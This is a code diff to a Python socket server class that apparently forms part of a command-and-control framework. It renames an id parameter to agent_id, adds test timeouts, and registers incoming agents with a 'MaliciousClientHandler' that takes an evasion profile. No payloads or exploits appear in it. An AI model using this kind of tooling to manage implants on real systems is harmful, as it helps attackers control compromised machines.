@@ -166,6 +166,7 @@ class ServerSockHandler:
 
         try:
             self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
             # this allows the socket to be reelased immediatly on crash/exit
             self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
@@ -304,7 +305,7 @@ class ServerSockHandler:
             if not self.agentloginhandler(
                 serversocket = self.serversocket,
                 raw_response_from_client=self.raw_response_from_client,
-                id = id
+                agent_id = self.client_id ## this should just be named id... buuut that's a reserved keyword
                 ):
 
                 print("Placeholder err msg")       
@@ -499,10 +500,10 @@ class ServerSockHandler:
                 print("precookie")
                 if SecurityEngine.AuthenticationHandler.Authentication.validate_cookie(request_cookie = client_request_cookie, valid_cookie = valid_cookie): 
                     print("pass to ClientHandler...")                    
-                    ##security checks too
+                    ##security checks too?
 
-                    ## if security checks out...
-                    print("Theoretical Client Handler here")
+                    ## Setting timeout to 5 sec as a test...
+                    serversocket.settimeout(5)
                     ## class instance...
                     self.clients[client_name] = ClientEngine.ClientHandler.ClientHandler(
                         request_from_client=request_from_client,
@@ -522,7 +523,7 @@ class ServerSockHandler:
             return False
             #logging.warning("[ERROR STUFF HERE ] Bad Auth Method attemtped")'''
 
-    def agentloginhandler(self, serversocket=None, raw_response_from_client=None, id=None):
+    def agentloginhandler(self, serversocket=None, raw_response_from_client=None, agent_id=None):
         logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
 
         '''
@@ -543,15 +544,14 @@ class ServerSockHandler:
 
         ## Bulletproofed as of 07/26/2023
         '''
-        if id is None:
+        if agent_id is None:
             logging.debug(f"{inspect.currentframe().f_back} Client ID is None. Returning False to continue with the next loop iteration")
             return False
 
         try:
 
             # Construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
-            agent_name = "agent_" + serversocket.getpeername()[0].replace(".", "_") + "_" + id
-
+            agent_name = "agent_" + serversocket.getpeername()[0].replace(".", "_") + "_" + agent_id#+ agent_id
             '''
             Explanation: 
                 English Translation:
@@ -572,13 +572,17 @@ class ServerSockHandler:
                 self.agents[agent_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler(sys_path=sys_path, evasion_profile_path=evasion_profile)
 
             # Create a new thread for this client's communication.
-            # Passing the response from client, the socket, and the id. 
+            # Passing the response from client, the socket, and the id.
+            #  
+            ## Setting timeout to 5 sec as a test...
+            serversocket.settimeout(5)
+
             threading.Thread(
                 target=self.agents[agent_name].handle_client,
-                args=(raw_response_from_client, serversocket, id)
+                args=(raw_response_from_client, serversocket, agent_id)
                 ).start()
 
-            logging.info(f"[Server.agentloginhandler(): {id} ] Client '{id}' accepted, new thread created")
+            logging.info(f"[Server.agentloginhandler(): {agent_id} ] Client '{agent_id}' accepted, new thread created")
 
         except KeyError as e:
             logging.debug(f"{inspect.currentframe().f_back} Missing key in login message: {e}")
